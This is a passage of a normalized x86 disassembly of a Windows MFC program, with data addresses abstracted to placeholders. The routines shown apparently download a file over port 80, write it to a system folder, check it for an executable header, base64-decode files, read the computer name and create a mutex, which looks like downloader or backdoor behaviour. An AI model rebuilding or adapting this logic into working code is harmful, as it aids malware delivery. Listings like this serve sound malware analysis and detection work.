or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x14 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x220 ]
push ecx
call [ CopyFileA@IAT ]
pop ebp
lea ebp [ ebx + 0x1 ]
jmp r-xdata
push 0x5c
push ebp
call [ strchr@IAT ]
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
sub_404ad0
mov eax [ esp + 0x4 ]
push esi
push rw-data
push eax
call [ fopen@IAT ]
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
push ebx
push ebp
push edi
mov edi [ fread@IAT ]
mov ebx 0x1
push esi
push ebx
lea ecx [ esp + 0x1c ]
push ebx
push ecx
call edi
add esp 0x10
test eax eax
je r-xdata
pop esi
retn
push esi
call [ fclose@IAT ]
add esp 0x4
mov eax ebx
pop edi
pop ebp
pop ebx
pop esi
retn
mov ebp [ isalpha@IAT ]
push esi
push 0x1
lea ecx [ esp + 0x1c ]
push 0x1
push ecx
call edi
add esp 0x10
test eax eax
je r-xdata
movsx eax [ esp + 0x14 ]
push eax
call [ isdigit@IAT ]
add esp 0x4
test eax eax
jne r-xdata
jmp r-xdata
mov al [ esp + 0x14 ]
cmp al 0x2b
je r-xdata
movsx edx [ esp + 0x14 ]
push edx
call ebp
add esp 0x4
test eax eax
jne r-xdata
cmp al 0x2f
je r-xdata
cmp al 0x3d
je r-xdata
cmp al 0xd
je r-xdata
cmp al 0xa
jne r-xdata
xor ebx ebx
sub_404b80
sub esp 0x110
push ebx
mov ebx 0xff
push esi
push edi
mov [ esp + 0x14 ] bl
mov [ esp + 0x15 ] bl
mov [ esp + 0x16 ] bl
mov [ esp + 0x17 ] bl
mov [ esp + 0x18 ] bl
mov [ esp + 0x19 ] bl
mov [ esp + 0x1a ] bl
mov [ esp + 0x1b ] bl
mov [ esp + 0x1c ] bl
mov [ esp + 0x1d ] bl
mov [ esp + 0x1e ] bl
mov [ esp + 0x1f ] bl
mov [ esp + 0x20 ] bl
mov [ esp + 0x21 ] bl
mov [ esp + 0x22 ] bl
mov [ esp + 0x23 ] bl
mov [ esp + 0x24 ] bl
mov [ esp + 0x25 ] bl
mov [ esp + 0x26 ] bl
mov [ esp + 0x27 ] bl
mov [ esp + 0x28 ] bl
mov [ esp + 0x29 ] bl
mov [ esp + 0x2a ] bl
mov [ esp + 0x2b ] bl
mov [ esp + 0x2c ] bl
mov [ esp + 0x2d ] bl
mov [ esp + 0x2e ] bl
mov [ esp + 0x2f ] bl
mov [ esp + 0x30 ] bl
mov [ esp + 0x31 ] bl
mov [ esp + 0x32 ] bl
mov [ esp + 0x33 ] bl
mov [ esp + 0x34 ] bl
mov [ esp + 0x35 ] bl
mov [ esp + 0x36 ] bl
mov [ esp + 0x37 ] bl
mov [ esp + 0x38 ] bl
mov [ esp + 0x39 ] bl
mov [ esp + 0x3a ] bl
mov [ esp + 0x3b ] bl
mov [ esp + 0x3c ] bl
mov [ esp + 0x3d ] bl
mov [ esp + 0x3e ] bl
mov [ esp + 0x3f ] 0x3e
mov [ esp + 0x40 ] bl
mov [ esp + 0x41 ] bl
mov [ esp + 0x42 ] bl
mov [ esp + 0x43 ] 0x3f
mov [ esp + 0x44 ] 0x34
mov [ esp + 0x45 ] 0x35
mov [ esp + 0x46 ] 0x36
mov [ esp + 0x47 ] 0x37
mov [ esp + 0x48 ] 0x38
mov [ esp + 0x49 ] 0x39
mov [ esp + 0x4a ] 0x3a
mov [ esp + 0x4b ] 0x3b
mov [ esp + 0x4c ] 0x3c
mov [ esp + 0x4d ] 0x3d
mov [ esp + 0x4e ] bl
mov [ esp + 0x4f ] bl
mov [ esp + 0x50 ] bl
mov [ esp + 0x51 ] bl
mov [ esp + 0x52 ] bl
mov [ esp + 0x53 ] bl
mov [ esp + 0x54 ] bl
mov [ esp + 0x55 ] 0x0
mov [ esp + 0x56 ] 0x1
mov [ esp + 0x57 ] 0x2
mov [ esp + 0x58 ] 0x3
mov [ esp + 0x59 ] 0x4
mov [ esp + 0x5a ] 0x5
mov [ esp + 0x5b ] 0x6
mov [ esp + 0x5c ] 0x7
mov [ esp + 0x5d ] 0x8
mov [ esp + 0x5e ] 0x9
mov [ esp + 0x5f ] 0xa
mov [ esp + 0x60 ] 0xb
mov [ esp + 0x61 ] 0xc
mov [ esp + 0x62 ] 0xd
mov [ esp + 0x63 ] 0xe
mov [ esp + 0x64 ] 0xf
mov [ esp + 0x65 ] 0x10
mov [ esp + 0x66 ] 0x11
mov [ esp + 0x67 ] 0x12
mov [ esp + 0x68 ] 0x13
mov [ esp + 0x69 ] 0x14
mov [ esp + 0x6a ] 0x15
mov [ esp + 0x6b ] 0x16
mov [ esp + 0x6c ] 0x17
mov [ esp + 0x6d ] 0x18
mov [ esp + 0x6e ] 0x19
mov [ esp + 0x6f ] bl
mov [ esp + 0x70 ] bl
mov [ esp + 0x71 ] bl
mov [ esp + 0x72 ] bl
mov [ esp + 0x73 ] bl
mov [ esp + 0x74 ] bl
mov [ esp + 0x75 ] 0x1a
mov [ esp + 0x76 ] 0x1b
mov [ esp + 0x77 ] 0x1c
mov [ esp + 0x78 ] 0x1d
mov [ esp + 0x79 ] 0x1e
mov [ esp + 0x7a ] 0x1f
mov [ esp + 0x7b ] 0x20
mov [ esp + 0x7c ] 0x21
mov [ esp + 0x7d ] 0x22
mov [ esp + 0x7e ] 0x23
mov [ esp + 0x7f ] 0x24
mov [ esp + 0x80 ] 0x25
mov [ esp + 0x81 ] 0x26
mov [ esp + 0x82 ] 0x27
mov [ esp + 0x83 ] 0x28
mov [ esp + 0x84 ] 0x29
mov [ esp + 0x85 ] 0x2a
mov [ esp + 0x86 ] 0x2b
mov [ esp + 0x87 ] 0x2c
mov [ esp + 0x88 ] 0x2d
mov [ esp + 0x89 ] 0x2e
mov [ esp + 0x8a ] 0x2f
mov [ esp + 0x8b ] 0x30
mov [ esp + 0x8c ] 0x31
mov [ esp + 0x8d ] 0x32
mov [ esp + 0x8e ] 0x33
mov [ esp + 0x8f ] bl
mov [ esp + 0x90 ] bl
mov [ esp + 0x91 ] bl
mov [ esp + 0x92 ] bl
mov [ esp + 0x93 ] bl
mov [ esp + 0x94 ] bl
mov [ esp + 0x95 ] bl
mov [ esp + 0x96 ] bl
mov [ esp + 0x97 ] bl
mov [ esp + 0x98 ] bl
mov [ esp + 0x99 ] bl
mov [ esp + 0x9a ] bl
mov [ esp + 0x9b ] bl
mov [ esp + 0x9c ] bl
mov [ esp + 0x9d ] bl
mov [ esp + 0x9e ] bl
mov [ esp + 0x9f ] bl
mov [ esp + 0xa0 ] bl
mov [ esp + 0xa1 ] bl
mov [ esp + 0xa2 ] bl
mov [ esp + 0xa3 ] bl
mov [ esp + 0xa4 ] bl
mov [ esp + 0xa5 ] bl
mov [ esp + 0xa6 ] bl
mov [ esp + 0xa7 ] bl
mov [ esp + 0xa8 ] bl
mov [ esp + 0xa9 ] bl
mov [ esp + 0xaa ] bl
mov [ esp + 0xab ] bl
mov [ esp + 0xac ] bl
mov [ esp + 0xad ] bl
mov [ esp + 0xae ] bl
mov [ esp + 0xaf ] bl
mov [ esp + 0xb0 ] bl
mov [ esp + 0xb1 ] bl
mov [ esp + 0xb2 ] bl
mov [ esp + 0xb3 ] bl
mov [ esp + 0xb4 ] bl
mov [ esp + 0xb5 ] bl
mov [ esp + 0xb6 ] bl
mov [ esp + 0xb7 ] bl
mov [ esp + 0xb8 ] bl
mov [ esp + 0xb9 ] bl
mov [ esp + 0xba ] bl
mov [ esp + 0xbb ] bl
mov [ esp + 0xbc ] bl
mov [ esp + 0xbd ] bl
mov [ esp + 0xbe ] bl
mov [ esp + 0xbf ] bl
mov [ esp + 0xc0 ] bl
mov [ esp + 0xc1 ] bl
mov [ esp + 0xc2 ] bl
mov [ esp + 0xc3 ] bl
mov [ esp + 0xc4 ] bl
mov [ esp + 0xc5 ] bl
mov [ esp + 0xc6 ] bl
mov [ esp + 0xc7 ] bl
mov [ esp + 0xc8 ] bl
mov [ esp + 0xc9 ] bl
mov [ esp + 0xca ] bl
mov [ esp + 0xcb ] bl
mov [ esp + 0xcc ] bl
mov [ esp + 0xcd ] bl
mov [ esp + 0xce ] bl
mov [ esp + 0xcf ] bl
mov [ esp + 0xd0 ] bl
mov [ esp + 0xd1 ] bl
mov [ esp + 0xd2 ] bl
mov [ esp + 0xd3 ] bl
mov [ esp + 0xd4 ] bl
mov [ esp + 0xd5 ] bl
mov [ esp + 0xd6 ] bl
mov [ esp + 0xd7 ] bl
mov [ esp + 0xd8 ] bl
mov [ esp + 0xd9 ] bl
mov [ esp + 0xda ] bl
mov [ esp + 0xdb ] bl
mov [ esp + 0xdc ] bl
mov [ esp + 0xdd ] bl
mov [ esp + 0xde ] bl
mov [ esp + 0xdf ] bl
mov [ esp + 0xe0 ] bl
mov [ esp + 0xe1 ] bl
mov [ esp + 0xe2 ] bl
mov [ esp + 0xe3 ] bl
mov [ esp + 0xe4 ] bl
mov [ esp + 0xe5 ] bl
mov [ esp + 0xe6 ] bl
mov [ esp + 0xe7 ] bl
mov [ esp + 0xe8 ] bl
mov [ esp + 0xe9 ] bl
mov [ esp + 0xea ] bl
mov [ esp + 0xeb ] bl
mov [ esp + 0xec ] bl
mov [ esp + 0xed ] bl
mov [ esp + 0xee ] bl
mov [ esp + 0xef ] bl
mov [ esp + 0xf0 ] bl
mov [ esp + 0xf1 ] bl
mov [ esp + 0xf2 ] bl
mov [ esp + 0xf3 ] bl
mov [ esp + 0xf4 ] bl
mov [ esp + 0xf5 ] bl
mov [ esp + 0xf6 ] bl
mov [ esp + 0xf7 ] bl
mov [ esp + 0xf8 ] bl
mov [ esp + 0xf9 ] bl
mov [ esp + 0xfa ] bl
mov [ esp + 0xfb ] bl
mov [ esp + 0xfc ] bl
mov [ esp + 0xfd ] bl
mov [ esp + 0xfe ] bl
mov [ esp + 0xff ] bl
mov [ esp + 0x100 ] bl
mov [ esp + 0x101 ] bl
mov [ esp + 0x102 ] bl
mov eax [ esp + 0x120 ]
mov esi [ fopen@IAT ]
push rw-data
push eax
mov [ esp + 0x10b ] bl
mov [ esp + 0x10c ] bl
mov [ esp + 0x10d ] bl
mov [ esp + 0x10e ] bl
mov [ esp + 0x10f ] bl
mov [ esp + 0x110 ] bl
mov [ esp + 0x111 ] bl
mov [ esp + 0x112 ] bl
mov [ esp + 0x113 ] bl
mov [ esp + 0x114 ] bl
mov [ esp + 0x115 ] bl
mov [ esp + 0x116 ] bl
mov [ esp + 0x117 ] bl
mov [ esp + 0x118 ] bl
mov [ esp + 0x119 ] bl
mov [ esp + 0x11a ] bl
mov [ esp + 0x11b ] bl
call esi
mov ecx [ esp + 0x12c ]
push rw-data
push ecx
mov edi eax
call esi
xor esi esi
add esp 0x10
cmp edi esi
mov [ esp + 0x118 ] eax
jne r-xdata
cmp eax esi
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x110
retn
push ebp
mov ebp [ fread@IAT ]
push edi
push 0x1
lea edx [ esp + 0x1c ]
push 0x1
push edx
mov [ esp + 0x128 ] esi
call ebp
add esp 0x10
test eax eax
je r-xdata
push edi
call [ fclose@IAT ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x110
retn
mov eax [ esp + 0x14 ]
mov eax [ esp + 0x14 ]
mov ecx eax
and ecx ebx
cmp [ esp + ecx + 0x18 ] bl
jne r-xdata
mov esi [ fclose@IAT ]
push edi
call esi
mov edx [ esp + 0x120 ]
push edx
call esi
add esp 0x8
mov eax 0x1
pop ebp
pop edi
pop esi
pop ebx
add esp 0x110
retn
mov edx [ esp + 0x14 ]
and edx ebx
mov cl [ esp + edx + 0x18 ]
cmp cl bl
je r-xdata
and eax ebx
push edi
push 0x1
lea ecx [ esp + 0x1c ]
mov al [ esp + eax + 0x20 ]
push 0x1
push ecx
mov [ esp + 0x22 ] al
call ebp
add esp 0x10
test eax eax
je r-xdata
push edi
push 0x1
lea edx [ esp + 0x1c ]
push 0x1
push edx
call ebp
add esp 0x10
test eax eax
jne r-xdata
push edi
push 0x1
lea ecx [ esp + 0x1c ]
push 0x1
push ecx
call ebp
add esp 0x10
test eax eax
jne r-xdata
mov eax esi
xor edx edx
mov ebp 0x3
div ebp
test edx edx
jne r-xdata
cmp edx 0x1
jne r-xdata
mov eax [ esp + 0x118 ]
test eax eax
je r-xdata
cmp edx 0x2
jne r-xdata
mov al [ esp + 0x12 ]
shr cl 0x2
shl al 0x4
or cl al
mov [ esp + 0x13 ] cl
jmp r-xdata
mov al [ esp + 0x12 ]
shr cl 0x4
shl al 0x2
or cl al
mov [ esp + 0x13 ] cl
jmp r-xdata
mov [ esp + 0x12 ] cl
mov [ esp + 0x118 ] edx
jmp r-xdata
mov eax [ esp + 0x11c ]
lea ecx [ esp + 0x13 ]
push eax
push 0x1
push 0x1
push ecx
call [ fwrite@IAT ]
mov edx [ esp + 0x24 ]
add esp 0x10
and edx ebx
inc esi
mov al [ esp + edx + 0x18 ]
mov [ esp + 0x12 ] al
mov al [ esp + 0x12 ]
mov [ esp + 0x118 ] 0x1
shl al 0x6
or al cl
mov [ esp + 0x13 ] al
mov ebp [ fread@IAT ]
sub_405340
mov eax [ esp + 0x4 ]
push esi
push rw-data
push eax
call [ fopen@IAT ]
mov esi eax
add esp 0x8
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push esi
push 0x2
lea ecx [ esp + 0x10 ]
push 0x1
push ecx
call [ fread@IAT ]
push esi
call [ fclose@IAT ]
add esp 0x14
cmp [ esp + 0x8 ] 0x5a4d
jne r-xdata
mov eax 0x1
pop esi
retn
sub_405390
sub esp 0x8c
push ebx
push 0x3e800
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
mov ecx [ esp + 0x94 ]
lea eax [ esp + 0x4 ]
push 0x0
push eax
push ebx
push 0x0
push rw-data
push ecx
push 0x50
push rw-data
mov [ esp + 0x28 ] 0x0
call sub_401950
add esp 0x20
test eax eax
jne r-xdata
pop ebx
add esp 0x8c
retn
mov edx [ esp + 0x4 ]
push ebp
push esi
lea eax [ esp + 0x14 ]
push edi
lea ecx [ esp + 0x1c ]
push eax
mov [ edx + ebx ] 0x0
push ecx
mov [ esp + 0x20 ] 0x80
call [ GetComputerNameA@IAT ]
mov edx [ esp + 0x10 ]
lea ebp [ ebx - 0x2 ]
add edx ebx
cmp ebp edx
jae r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
xor eax eax
pop ebx
add esp 0x8c
retn
push ebx
call [ free@IAT ]
mov eax [ esp + 0x18 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8c
retn
test ebp ebp
je r-xdata
lea edi [ ebp + 0x2 ]
push 0xd
push edi
call [ strchr@IAT ]
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
lea esi [ esp + 0x1c ]
mov ecx edi
mov [ ebp ] 0x0
sbb ecx ecx
sbb ecx 0xffffffff
test dl dl
je r-xdata
mov [ esp + 0x14 ] 0x1
mov ecx [ esp + 0x10 ]
add ecx ebx
cmp ebp ecx
jb r-xdata
xor ecx ecx
jmp r-xdata
mov al [ ecx + 0x1 ]
mov dl al
cmp al [ esi + 0x1 ]
jne r-xdata
jmp r-xdata
test ecx ecx
je r-xdata
add ecx 0x2
add esi 0x2
test dl dl
jne r-xdata
mov al [ ecx ]
mov dl al
cmp al [ esi ]
jne r-xdata
sub_4054b0
sub esp 0x210
push ebx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x210
retn
mov ecx [ esp + 0x220 ]
lea eax [ esp + 0xc ]
push 0x0
push eax
push ebx
push 0x0
push rw-data
push ecx
push 0x50
push rw-data
call sub_401950
add esp 0x20
test eax eax
je r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
mov esi [ SHGetSpecialFolderPathA@IAT ]
push 0x0
lea edx [ esp + 0x11c ]
push 0x2
push edx
push 0x0
call esi
mov eax [ esp + 0x224 ]
mov edi [ sprintf@IAT ]
push eax
lea ecx [ esp + 0x11c ]
push rw-data
push ecx
lea edx [ esp + 0x124 ]
push rw-data
push edx
call edi
add esp 0x14
lea eax [ esp + 0x14 ]
push 0x0
push 0x2
push eax
push 0x0
call esi
push rw-data
lea ecx [ esp + 0x18 ]
push rw-data
push ecx
lea edx [ esp + 0x20 ]
push rw-data
push edx
call edi
add esp 0x14
lea eax [ esp + 0x14 ]
push 0x0
push 0x20
push 0x2
push 0x0
push 0x0
push 0x40000000
push eax
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov edx [ esp + 0xc ]
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
push edx
push ebx
push esi
call [ WriteFile@IAT ]
push esi
mov edi eax
call [ CloseHandle@IAT ]
push ebx
call [ free@IAT ]
add esp 0x4
test edi edi
je r-xdata
lea eax [ esp + 0x14 ]
push eax
call sub_404ad0
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x118 ]
push 0x0
lea ecx [ esp + 0x18 ]
push eax
push ecx
call [ CopyFileA@IAT ]
lea ecx [ esp + 0x118 ]
lea edx [ esp + 0x14 ]
push ecx
push edx
call sub_404b80
add esp 0x8
jmp r-xdata
lea ecx [ esp + 0x118 ]
push ecx
call sub_403da0
add esp 0x4
mov eax 0x1
pop edi
pop esi
pop ebx
add esp 0x210
retn
lea edx [ esp + 0x14 ]
push edx
call [ DeleteFileA@IAT ]
lea eax [ esp + 0x118 ]
push eax
call sub_405340
add esp 0x4
test eax eax
je r-xdata
sub_405660
push ecx
push ebp
push edi
push 0x3e800
xor ebp ebp
call [ malloc@IAT ]
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
mov ecx [ esp + 0x10 ]
lea eax [ esp + 0x8 ]
push 0x0
push eax
push edi
push 0x0
push rw-data
push ecx
push 0x50
push rw-data
call sub_401950
add esp 0x20
test eax eax
jne r-xdata
pop edi
pop ebp
pop ecx
retn
mov edx [ esp + 0x8 ]
push ebx
push esi
mov esi rw-data
mov [ edx + edi ] 0x0
mov eax edi
push edi
call [ free@IAT ]
add esp 0x4
xor eax eax
pop edi
pop ebp
pop ecx
retn
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push edi
call [ free@IAT ]
add esp 0x4
mov eax ebp
pop edi
pop ebp
pop ecx
retn
mov ebp 0x1
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
pop esi
pop ebx
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
sub_405710
mov eax [ rw-data ]
push esi
mov esi [ free@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x0
call esi
add esp 0x4
call [ Ordinal_WSOCK32_116@IAT ]
push 0x1
call [ exit@IAT ]
push 0x0
call esi
add esp 0x4
sub_405750
push ecx
push esi
push 0x10
push rw-data
call sub_402b70
push 0x14
push rw-data
call sub_402b70
push 0x18
push rw-data
call sub_402b70
mov esi [ CreateEventA@IAT ]
add esp 0x18
push rw-data
push 0x0
push 0x0
push 0x0
call esi
push rw-data
push 0x0
push 0x0
push 0x0
mov [ rw-data ] eax
call esi
push rw-data
push 0x0
push 0x1f0001
mov [ rw-data ] eax
call [ OpenMutexA@IAT ]
test eax eax
pop esi
je r-xdata
push rw-data
push 0x0
push 0x0
call [ CreateMutexA@IAT ]
lea edx [ esp ]
push edx
push 0x0
push 0x0
push r-xdata
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov eax 0x1
pop ecx
retn
push eax
call [ CloseHandle@IAT ]
mov eax [ rw-data ]
push eax
call [ SetEvent@IAT ]
mov ecx [ rw-data ]
push 0x1388
push ecx
call [ WaitForSingleObject@IAT ]
push 0x1f4
call [ Sleep@IAT ]
sub_4058d0
push ebp
mov ebp esp
push 0xffffffff
push sub_406148
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x6c
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
call sub_405750
test eax eax
jne r-xdata
push 0x0
mov [ ebp - 0x4 ] 0xffffffff
call Ordinal_MFC42_1134
add esp 0x4
mov ecx esi
call Ordinal_MFC42_2621
push 0x0
lea ecx [ ebp - 0x78 ]
call sub_4059f0
lea eax [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0x20 ] eax
call sub_401000
push 0x0
call [ exit@IAT ]
push eax
call [ exit@IAT ]
sub_4059f0
push 0xffffffff
push sub_406168
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
mov esi ecx
push eax
push 0x66
mov [ esp + 0xc ] esi
call Ordinal_MFC42_324
mov [ esp + 0x10 ] 0x0
mov [ esi ] r--data
call Ordinal_MFC42_1168
push 0x80
push 0xe
push 0x80
call Ordinal_MFC42_1146
push eax
call [ LoadIconA@IAT ]
mov ecx [ esp + 0x8 ]
mov [ esi + 0x60 ] eax
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_405a80
push 0xffffffff
push sub_406188
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push edi
mov esi ecx
call Ordinal_MFC42_4710
mov eax [ esi + 0x20 ]
push 0x0
push eax
call [ GetSystemMenu@IAT ]
push eax
call Ordinal_MFC42_2863
mov edi eax
test edi edi
je r-xdata
mov edx [ esi + 0x60 ]
mov eax [ esi + 0x20 ]
mov edi [ SendMessageA@IAT ]
push edx
push 0x1
push 0x80
push eax
call edi
mov ecx [ esi + 0x60 ]
mov edx [ esi + 0x20 ]
push ecx
push 0x0
push 0x80
push edx
call edi
mov ecx [ esp + 0xc ]
pop edi
mov eax 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
lea ecx [ esp + 0x8 ]
call Ordinal_MFC42_540
push 0x65
lea ecx [ esp + 0xc ]
mov [ esp + 0x18 ] 0x0
call Ordinal_MFC42_4160
mov ecx [ esp + 0x8 ]
mov eax [ ecx - 0x8 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x8 ]
mov [ esp + 0x14 ] 0xffffffff
call Ordinal_MFC42_800
mov edx [ edi + 0x4 ]
push ebx
mov ebx [ AppendMenuA@IAT ]
push 0x0
push 0x0
push 0x800
push edx
call ebx
mov eax [ esp + 0xc ]
mov ecx [ edi + 0x4 ]
push eax
push 0x10
push 0x0
push ecx
call ebx
pop ebx
sub_405b60
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4061a8
push eax
mov eax [ esp + 0x10 ]
mov [ fs : 0x0 ] esp
and eax 0xfff0
sub esp 0x60
cmp eax 0x10
jne r-xdata
call Ordinal_MFC42_2379
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
add esp 0x6c
retn 0x8
lea ecx [ esp ]
call sub_405990
lea ecx [ esp ]
mov [ esp + 0x68 ] 0x0
call Ordinal_MFC42_2514
lea ecx [ esp ]
mov [ esp + 0x68 ] 0xffffffff
call Ordinal_MFC42_641
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
add esp 0x6c
retn 0x8
sub_405be0
sub esp 0x64
push esi
mov esi ecx
mov eax [ esi + 0x20 ]
push eax
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov ecx esi
call Ordinal_MFC42_2379
pop esi
add esp 0x64
retn
push ebx
push edi
push esi
lea ecx [ esp + 0x20 ]
call Ordinal_MFC42_470
mov edi [ esp + 0x20 ]
lea eax [ esp + 0x1c ]
mov ecx [ esi + 0x20 ]
push 0x0
neg eax
sbb eax eax
and eax edi
push eax
push 0x27
push ecx
call [ SendMessageA@IAT ]
mov edi [ GetSystemMetrics@IAT ]
push 0xb
call edi
push 0xc
mov ebx eax
call edi
mov edi eax
mov eax [ esi + 0x20 ]
lea edx [ esp + 0xc ]
push edx
push eax
call [ GetClientRect@IAT ]
mov ecx [ esi + 0x60 ]
mov eax [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x14 ]
sub eax ecx
sub eax edi
inc eax
cdq
sub eax edx
mov edx [ esp + 0x10 ]
sar eax 0x1
push eax
mov eax [ esp + 0x1c ]
sub eax edx
sub eax ebx
inc eax
cdq
sub eax edx
mov edx [ esp + 0x28 ]
sar eax 0x1
push eax
push edx
call [ DrawIcon@IAT ]
lea ecx [ esp + 0x1c ]
call Ordinal_MFC42_755
pop edi
pop ebx
pop esi
add esp 0x64
retn
sub_405ed0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_4060c3
cmp [ rw-data ] ebx
jne r-xdata
call sub_4060ae
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_4060c0
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_4060d0
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_4060e8
call Ordinal_MFC42_1168
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test ecx ecx
mov [ eax + 0x14 ] cl
mov [ eax + 0x1040 ] edx
jne r-xdata
push 0x1
pop eax
retn 0x8
push 0xfffffffd
call [ _setmbcp@IAT ]
pop ecx
sub_40106f
mov eax r-xdata
retn
sub_401640
sub esp 0x190
lea eax [ esp ]
push eax
push 0x2
call [ Ordinal_WSOCK32_115@IAT ]
neg eax
sbb eax eax
inc eax
add esp 0x190
retn
sub_4017e0
call sub_401660
push rw-data
push rw-data
call sub_404870
add esp 0x8
retn
sub_402240
push rw-data
call sub_405660
add esp 0x4
test eax eax
jne r-xdata
push rw-data
push rw-data
call sub_4054b0
add esp 0x8
retn
retn
sub_4022b0
push rw-data
push rw-data
call sub_4054b0
add esp 0x8
retn
sub_4022d0
push rw-data
call sub_405390
add esp 0x4
test eax eax
jne r-xdata
push rw-data
push rw-data
call sub_4054b0
add esp 0x8
retn
retn
sub_403060
mov eax [ rw-data ]
mov edx [ eax ]
lea ecx [ eax + 0x4 ]
push ecx
push edx
call sub_402ea0
add esp 0x8
retn
sub_403780
mov eax [ rw-data ]
push eax
call sub_403da0
add esp 0x4
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_403b60
sub_405820
mov eax [ Ordinal_MFC42_4274@IAT ]
retn
sub_405830
mov eax r--data
retn
sub_405840
push esi
mov esi ecx
push 0x0
call Ordinal_MFC42_561
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_405860
push esi
mov esi ecx
call sub_405880
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_405880
jmp r-xdata
jmp [ Ordinal_MFC42_815@IAT ]
sub_405890
call sub_4058a0
jmp sub_4058b0
sub_4058a0
mov ecx rw-data
jmp sub_405840
sub_4058b0
push sub_4058c0
call sub_405f2b
pop ecx
retn
sub_4058c0
mov ecx rw-data
jmp sub_405880
sub_405960
jmp Ordinal_MFC42_641
sub_405970
retn
sub_405980
retn 0x4
sub_405990
push esi
push 0x0
mov esi ecx
